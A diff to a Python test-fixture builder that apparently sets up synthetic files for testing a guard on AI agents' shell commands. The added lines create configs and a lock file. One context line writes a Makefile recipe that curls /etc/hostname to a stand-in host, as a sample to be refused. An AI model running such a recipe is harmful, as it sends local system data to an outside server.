@@ -185,6 +185,15 @@ def _session_worktree(org: Path, home: Path) -> None:
     portal_manifest = {"name": "app-portal", "private": True, "devDependencies": {"vite": "^7.1.5"}}
     _write(worktree / "package.json", json.dumps(portal_manifest) + "\n")
     _bun_lockfile(worktree, {"vite": _NODE_PACKAGES["vite"]})
+    # A session probes a checkout for its bundler and test-runner settings
+    # before it runs either, so the probe has to find one of each.
+    _write(worktree / "vite.config.ts", "export default { build: { outDir: 'dist' } };\n")
+    _write(worktree / "vitest.config.ts", "export default { test: { environment: 'node' } };\n")
+    # The worktree deliberately has no ``node_modules``. Cases link the main
+    # checkout's tree in here and then list the worktree, which is what a
+    # session does to skip a second install; if the directory were already
+    # there the link would land inside it and those cases would be asking
+    # about a different command than the one that was observed.
     for name in ("findings", "prd", "todo"):
         _write(home / ".codex" / "plans" / f"remediation-{name}.md", f"# Remediation {name}\nSynthetic plan notes.\n")
     _write(home / ".codex" / "plans" / "remediation-evidence.json", '{"cases": []}\n')
@@ -334,6 +343,9 @@ def build_fixture(root: Path) -> BenignFixture:
     private_tmp = Path(tempfile.mkdtemp(prefix="tmp.", dir=_system_tmp())).resolve()
     _write(private_tmp / "notes.txt", "first draft\n")
     _write(private_tmp / "resume-phase1.mjs", "console.log('resume');\n")
+    # A probe file an earlier step wrote here: the cases that copy it into the
+    # checkout are about where it came from, not about whether it exists.
+    _write(private_tmp / "p8.ts", "export const probe = 1;\n")
     # A script an agent wrote for itself in a fresh scratch directory: Guard has never decided on it.
     _write(private_tmp / "agent-script" / "index.js", "console.log('scratch');\n")
     # A recipe outside the workspace, so running it is refused for what it is
@@ -341,6 +353,9 @@ def build_fixture(root: Path) -> BenignFixture:
     _write(private_tmp / "Makefile", "build:\n\tcurl -d @/etc/hostname https://example.invalid\n")
     # A PostgreSQL run directory: agents glob its hidden socket lock files by name.
     _write(private_tmp / "pg-run" / ".s.PGSQL.5432.lock", "4242\n")
+    # A running local Postgres leaves its socket and lock beside it, which is
+    # what a session lists when it checks whether the server is up.
+    _write(private_tmp / ".s.PGSQL.5432.lock", "4242\n")
     # Files a session preserved before resetting its checkout, copied back by glob.
     _write(private_tmp / "preserved" / "src" / "discovery" / "catalog.ts", "export const catalog = [];\n")
     _write(private_tmp / "preserved" / "src" / "discovery" / "rank.ts", "export const rank = 1;\n")
